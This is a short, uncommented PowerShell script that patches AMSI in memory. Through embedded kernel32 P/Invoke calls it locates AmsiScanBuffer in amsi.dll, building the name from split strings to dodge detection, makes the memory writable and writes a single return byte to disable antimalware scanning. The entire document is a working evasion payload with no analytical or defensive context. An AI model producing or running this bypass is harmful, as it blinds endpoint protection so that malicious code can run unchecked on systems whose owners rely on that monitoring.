Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class Kernel32
{
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
        public static extern IntPtr GetModuleHandle(
            [MarshalAs(UnmanagedType.LPStr)]string lpFileName);
         
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);
            
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
}
"@

$AmsiHandle = [Kernel32]::GetModuleHandle("amsi.dll")

$FuncName = "AmsiScan"
$FuncName += "Buffer"
$FuncPtr = [Kernel32]::GetProcAddress($AmsiHandle, $FuncName)

$OldProtection = 0
[Kernel32]::VirtualProtect($FuncPtr, [uint32]1, 0x40, [ref]$OldProtection)

$Patch = [Byte[]] (0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $FuncPtr, 1)
